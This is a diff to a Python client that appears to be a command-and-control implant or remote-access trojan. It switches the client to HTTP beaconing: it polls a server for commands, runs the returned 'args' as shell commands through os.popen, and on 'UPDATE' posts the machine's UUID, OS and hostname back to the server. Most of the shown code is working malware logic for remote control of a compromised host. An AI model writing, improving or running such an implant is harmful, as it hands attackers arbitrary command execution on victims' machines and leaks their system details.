@@ -36,34 +36,28 @@ def closeSocket(socket):
 
 def beacon():
     r = requests.get(url = str("http://" + SERVER_IP + ":" + str(SERVER_PORT) + "/client/" + str(UUID) + "/commands"))
+    return r.text
 
 def httpPost():
     data = {'UUID':UUID,
             'OS':OS,
             'HOSTNAME':HOSTNAME}
-    r = requests.post(url = str("http://" + SERVER_IP + ":" + str(SERVER_PORT)), params = data)
+    r = requests.post(url = str("http://" + SERVER_IP + ":" + str(SERVER_PORT) + "/update"), params = data)
 
 
 if __name__ == "__main__":
     print("Starting client")
     while failCount < MAX_FAILS:
         try:
-            s = connectToServer(SERVER_IP, SERVER_PORT)
-            s.settimeout(5)
-            beacon()
+            data = ""
+            data =  beacon()
             print("BEACONED")
             failCount = 0
             time.sleep(5)
         except:
             failCount += 1
             print("FAILS: " + str(failCount))
-        print("Recieving data")
-        data = ""
-        try:
-            data = s.recv(BUFFER_SIZE).decode()
-        except:
-            pass
-        if data:
+        if data != "{}" and data:
             print(data)
             serverText = json.loads(data)
             print(serverText["command"])
@@ -72,8 +66,4 @@ if __name__ == "__main__":
                 print(os.popen(serverText["args"]).read())
             elif serverText["command"] == "UPDATE":
                 httpPost()
-        try:
-            closeSocket(s)
-        except:
-            pass
         time.sleep(random.randint(1,10))
